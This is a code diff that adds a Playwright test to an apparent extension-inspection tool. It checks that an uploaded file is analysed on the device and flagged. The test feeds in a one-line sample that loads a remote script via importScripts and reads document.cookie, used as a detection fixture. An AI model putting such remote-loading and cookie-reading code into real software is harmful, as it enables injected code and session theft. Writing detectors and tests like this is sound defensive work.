@@ -46,3 +46,28 @@ test('the inventory lists what is installed, with what each may do', async ({
   await expect(panel.locator('[data-role=installed] h2')).toHaveText('Installed (0)')
   await expect(panel.locator('[data-role=installed-row]')).toHaveCount(0)
 })
+
+test('SCN-018 — a package the user supplies is read on the device and reported', async ({
+  context,
+  extensionId,
+}) => {
+  // No browser hands one extension another's code, so this is the only runtime
+  // path the analyser has. It is also the one that proves the analyser is
+  // wired at all: before this control existed, nothing in the product called it.
+  const page = await context.newPage()
+  await page.goto(`chrome-extension://${extensionId}/options.html`)
+
+  await expect(page.locator('[data-role=analysis-note]')).toContainText(
+    'nothing here can be analysed',
+  )
+
+  await page.locator('[data-role=inspect]').setInputFiles({
+    name: 'suspect.js',
+    mimeType: 'text/javascript',
+    buffer: Buffer.from('importScripts("https://cdn.test/loader.js"); const c = document.cookie'),
+  })
+
+  const findings = page.locator('[data-role=analysis] [data-role=finding]')
+  await expect(findings.first()).toBeVisible()
+  await expect(page.locator('[data-role=analysis-caveat]')).toContainText('proof of intent')
+})
